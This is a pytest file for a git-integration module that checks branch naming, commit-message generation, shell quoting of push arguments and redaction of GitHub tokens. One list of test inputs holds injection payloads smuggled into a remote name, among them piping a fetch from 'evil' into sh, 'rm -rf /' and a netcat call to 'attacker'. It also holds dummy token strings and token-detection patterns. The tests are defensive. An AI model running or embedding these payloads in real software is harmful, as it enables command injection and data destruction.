"""PRD-170 S5 — canvas git integration: branch/commit-message + token-leak class.

Two concerns, both DB-free/container-free:

  * the EDITABLE commit-message generator and the ``canvas/<session-id>`` branch
    naming (pure logic);
  * the SECURITY gate — the PRD-154 S12 token-leak discipline RE-APPLIED to the
    canvas git path: no token material may reach logs, errors, or returned
    payloads. This test class BLOCKS (it is security, never deferred). It mirrors
    S12.5's clone-error strip: git echoes the authed remote URL
    (``https://<token>@github.com/…``) in failure text — the redaction must
    remove the token while keeping the message useful.

Pure stdlib + pytest — no DB, no container, no git process.
"""
from __future__ import annotations

import re

import pytest

from modules.tools.discovery.canvas_git import (
    CommitContext,
    build_authenticated_remote,
    canvas_branch_name,
    generate_commit_message,
    plan_commit_push,
    redact_token,
)


# ---------------------------------------------------------------------------
# Branch-per-session
# ---------------------------------------------------------------------------
def test_branch_name_is_canvas_prefixed():
    assert canvas_branch_name("canvas_abc123") == "canvas/canvas_abc123"


def test_branch_name_slugifies_unsafe_refs():
    # spaces, traversal, and separators are sanitised to a valid git ref.
    name = canvas_branch_name("  weird ../ name..x  ")
    assert name.startswith("canvas/")
    assert " " not in name
    assert ".." not in name
    assert "/canvas/" not in name[len("canvas/"):]  # no nested escape


def test_branch_name_empty_falls_back():
    assert canvas_branch_name("") == "canvas/session"


# ---------------------------------------------------------------------------
# Editable commit-message generator (deterministic — no LLM)
# ---------------------------------------------------------------------------
def test_commit_message_uses_intent_as_subject():
    msg = generate_commit_message(
        CommitContext(changed_paths=["src/app.py"], branch="canvas/x", intent="add input validation")
    )
    first = msg.splitlines()[0]
    assert first.endswith("add input validation")
    assert ":" in first  # conventional-commit "type: subject"


def test_commit_message_lists_changed_files():
    msg = generate_commit_message(
        CommitContext(changed_paths=["a.py", "b.py"], branch="canvas/x")
    )
    assert "- a.py" in msg
    assert "- b.py" in msg


def test_commit_message_infers_docs_type_for_readme():
    msg = generate_commit_message(
        CommitContext(changed_paths=["README.md"], branch="canvas/x")
    )
    assert msg.splitlines()[0].startswith("docs:")


def test_commit_message_infers_test_type():
    msg = generate_commit_message(
        CommitContext(changed_paths=["tests/test_x.py"], branch="canvas/x")
    )
    assert msg.splitlines()[0].startswith("test:")


def test_commit_message_truncates_many_files():
    paths = [f"f{i}.py" for i in range(30)]
    msg = generate_commit_message(CommitContext(changed_paths=paths, branch="canvas/x"))
    assert "and 10 more" in msg


def test_commit_message_is_editable_plain_text():
    # It is a plain string the UI can pre-fill and the user can rewrite.
    msg = generate_commit_message(CommitContext(changed_paths=["x.py"], branch="canvas/x"))
    assert isinstance(msg, str) and msg.strip()


# ---------------------------------------------------------------------------
# Commit+push plan — reuses the existing workspace_git verbs
# ---------------------------------------------------------------------------
def test_plan_commit_push_uses_canvas_branch_and_reuses_git_verbs():
    steps = plan_commit_push("canvas_abc123", "feat: add validation")
    ops = [s.operation for s in steps]
    assert ops == ["checkout", "add", "commit", "push"]
    # branch-per-session on both the checkout and the push
    assert "canvas/canvas_abc123" in steps[0].args
    # remote is single-quoted (command-injection hardening)
    assert "-u 'origin'" in steps[-1].args
    assert "canvas/canvas_abc123" in steps[-1].args


def test_plan_commit_push_quotes_message_safely():
    steps = plan_commit_push("s1", "fix: it's a 'tricky' message")
    commit = next(s for s in steps if s.operation == "commit")
    # message is single-quoted; embedded quotes escaped — no arg-injection.
    assert commit.args.startswith("-m '")
    assert "it'\\''s" in commit.args


def test_plan_commit_push_never_contains_token_material():
    steps = plan_commit_push("s1", "feat: x")
    blob = " ".join(f"{s.operation} {s.args}" for s in steps)
    assert re.search(r"gh[posu]_[A-Za-z0-9]{20,}", blob) is None
    assert "@github.com" not in blob  # no authed remote in the plan


# ---------------------------------------------------------------------------
# Command-injection: the git remote is validated + single-quoted (SECURITY)
# ---------------------------------------------------------------------------
# The worker runs `git push {args}` as a SHELL string; an unquoted, caller-
# supplied remote would be injection. Two gates: allowlist validation raises on
# metacharacters, and the emitted push arg single-quotes the remote regardless.
_MALICIOUS_REMOTES = [
    "origin; curl evil|sh #",
    "origin && rm -rf /",
    "origin`whoami`",
    "$(touch /tmp/pwned)",
    "origin | nc attacker 4444",
    "a remote with spaces",
    'origin"; echo hi; "',
]


@pytest.mark.parametrize("bad", _MALICIOUS_REMOTES)
def test_plan_commit_push_rejects_malicious_remote(bad):
    # Gate 1: allowlist validation rejects a metacharacter-bearing remote.
    with pytest.raises(ValueError):
        plan_commit_push("s1", "feat: x", remote=bad)


def test_plan_commit_push_push_arg_single_quotes_remote():
    # Gate 2 (defense in depth): a benign remote is single-quoted in the push
    # arg — never bare — so even a quoting-only regression stays safe.
    steps = plan_commit_push("s1", "feat: x", remote="upstream")
    push = next(s for s in steps if s.operation == "push")
    assert "-u 'upstream'" in push.args
    # And the branch is quoted too.
    assert "'canvas/s1'" in push.args


def test_plan_commit_push_accepts_url_and_name_remotes():
    for good in ("origin", "upstream", "https://github.com/o/r.git", "git@github.com:o/r.git"):
        steps = plan_commit_push("s1", "feat: x", remote=good)
        push = next(s for s in steps if s.operation == "push")
        # single-quoted, and the exact value preserved inside the quotes.
        assert f"-u '{good}'" in push.args


def test_no_metachar_remote_survives_unquoted_in_any_step():
    # Belt-and-braces: for a benign remote, NO push arg contains a bare
    # shell metacharacter outside the single-quoted spans.
    steps = plan_commit_push("s1", "feat: x", remote="origin")
    for s in steps:
        # strip single-quoted spans, then assert no metacharacters remain
        stripped = re.sub(r"'[^']*'", "", s.args)
        assert not re.search(r"[;&|`$()<>]", stripped), (
            f"bare metacharacter in {s.operation} args: {s.args!r}"
        )


# ---------------------------------------------------------------------------
# PRD-154 S12 token-leak class — RE-APPLIED (security, BLOCKS)
# ---------------------------------------------------------------------------
_TOKENS = [
    "ghp_SUPERSECRETTOKEN1234567890",
    "github_pat_11ABCDEFG0123456789_abcdefghijklmnopqrstuvwxyz012345",
    "gho_anotherSecretValue0987654321",
]


def test_redact_removes_exact_token_value():
    for token in _TOKENS:
        text = f"remote: fatal auth for https://{token}@github.com/o/r.git failed"
        red = redact_token(text, token)
        assert token not in red
        # message stays useful — the host/path survive.
        assert "github.com/o/r.git" in red


def test_redact_strips_url_userinfo_even_without_known_token():
    # The exact token isn't passed, but a creds@host URL must still be scrubbed.
    text = "error cloning https://x-access-token:ghs_deadbeefdeadbeefdead@github.com/o/r.git"
    red = redact_token(text)
    assert "ghs_deadbeefdeadbeefdead" not in red
    assert "x-access-token" not in red
    # userinfo collapsed to ***@ (the credential is gone; host survives).
    assert "***@github.com" in red
    assert "x-access-token:" not in red


def test_redact_strips_bare_github_token_shape():
    text = "Authorization: token ghp_abcdefghijklmnopqrstuvwxyz0123 failed"
    red = redact_token(text)
    assert "ghp_abcdefghijklmnopqrstuvwxyz0123" not in red
    assert "***" in red


def test_redact_is_safe_on_clean_text():
    text = "nothing secret here: pushed 3 commits to canvas/abc"
    assert redact_token(text, "ghp_x") == text


def test_authenticated_remote_injects_token_but_is_never_the_logged_form():
    token = "ghp_SUPERSECRETTOKEN1234567890"
    url = "https://github.com/o/r.git"
    authed = build_authenticated_remote(url, token)
    # The authed URL DOES carry the token (that's its job) ...
    assert token in authed
    # ... but the redacted form a caller would log does NOT.
    assert token not in redact_token(authed, token)
    assert "***@github.com/o/r.git" in redact_token(authed, token)


def test_authenticated_remote_leaves_non_github_urls_alone():
    assert build_authenticated_remote("git@github.com:o/r.git", "ghp_x") == "git@github.com:o/r.git"
    assert build_authenticated_remote("https://example.com/r.git", "ghp_x") == "https://example.com/r.git"


def test_no_token_shape_survives_redaction_anywhere():
    # Belt-and-braces: a blob with several credential shapes is fully scrubbed.
    blob = (
        "clone https://ghp_aaaaaaaaaaaaaaaaaaaaaa@github.com/o/r.git\n"
        "push https://x:github_pat_1122334455_zzzzzzzzzzzzzzzzzzzzzz@github.com/o/r.git\n"
        "token gho_bbbbbbbbbbbbbbbbbbbbbb\n"
    )
    red = redact_token(blob)
    # No credential SHAPE survives anywhere — the actual security property.
    assert re.search(r"gh[posu]_[A-Za-z0-9]{20,}", red) is None
    assert re.search(r"github_pat_[A-Za-z0-9_]{20,}", red) is None
    # Every URL userinfo is collapsed to the redaction marker — no real creds.
    for m in re.finditer(r"https?://([^/@\s]+)@", red):
        assert m.group(1) == "***", f"unredacted userinfo survived: {m.group(1)}"
